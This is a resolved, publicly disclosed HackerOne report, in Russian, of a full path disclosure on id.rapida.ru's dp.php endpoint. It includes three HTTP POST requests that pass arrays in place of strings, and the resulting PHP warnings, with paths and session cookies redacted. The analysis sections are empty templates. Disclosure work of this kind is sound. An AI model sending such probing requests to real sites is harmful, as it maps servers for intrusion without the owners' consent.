---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '165219'
original_report_id: '165219'
title: '[id.rapida.ru] Full Path Disclosure'
weakness: Information Disclosure
team_handle: qiwi
created_at: '2016-09-02T08:52:53.996Z'
disclosed_at: '2018-11-18T07:11:29.648Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 19
tags:
- hackerone
- information-disclosure
---

# [id.rapida.ru] Full Path Disclosure

## Metadata

- HackerOne Report ID: 165219
- Weakness: Information Disclosure
- Program: qiwi
- Disclosed At: 2018-11-18T07:11:29.648Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

**Уязвимый сценарий:** dp.php

Включено отображение подробной информации об ошибках. При использовании массива вместо строки выводится полный путь до веб директории.

Примеры путей:
```
██████████████████
███████
█████████
```

Примеры запросов:

Пример 1 (нужно подставить валидное значение сессии)
```http
POST /dp.php HTTP/1.1
Host: id.rapida.ru
Cookie: rsid=██████████████████████████████
Connection: close
Content-Length: 49

{"function":["GetCurrentUserPaymentMethodsList"]}
```

```html
<br />
<b>Warning</b>:  Illegal offset type in isset or empty in <b>███████████</b> on line <b>379</b><br />
<br />
<b>Warning</b>:  strip_tags() expects parameter 1 to be string, array given in <b>████████████████</b> on line <b>93</b><br />
```


Пример 2
```http
POST /dp.php HTTP/1.1
Host: id.rapida.ru

{"function":"LoginUser","params":{"phone":["9277215278"]}}
```


```html
<br />
<b>Notice</b>:  Array to string conversion in <b>█████</b> on line <b>16</b><br />
{"status":"error","statusMessage":"\u041e\u0448\u0438\u0431\u043a\u0430 \u043f\u0440\u0438 \u0437\u0430\u043f\u043e\u043b\u043d\u0435\u043d\u0438\u0438 \u043f\u0430\u0440\u0430\u043c\u0435\u0442\u0440\u043e\u0432","data":{"error_req_params":[{"name":"phone","description":"\u041f\u0430\u0440\u0430\u043c\u0435\u0442\u0440 \u0437\u0430\u0434\u0430\u043d \u043d\u0435\u0432\u0435\u0440\u043d\u043e"}]},"time":0,"errorCode":-6,"version":""}
```

Пример 3 (нужно подставить валидное значение сессии)
```http
POST /dp.php HTTP/1.1
Host: id.rapida.ru
Cookie: rsid=██████████████████████████████
Connection: close
Content-Length: 48

{"function":"SetThemeId","params":{"Value":[1]}}
```
```html
<br />
<b>Warning</b>:  htmlspecialchars() expects parameter 1 to be string, array given in <b>███████████████████</b> on line <b>83</b><br />
{"status":"ok","statusMessage":"","data":{"code":0,"description":""},"time":0,"errorCode":0,"version":""}
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
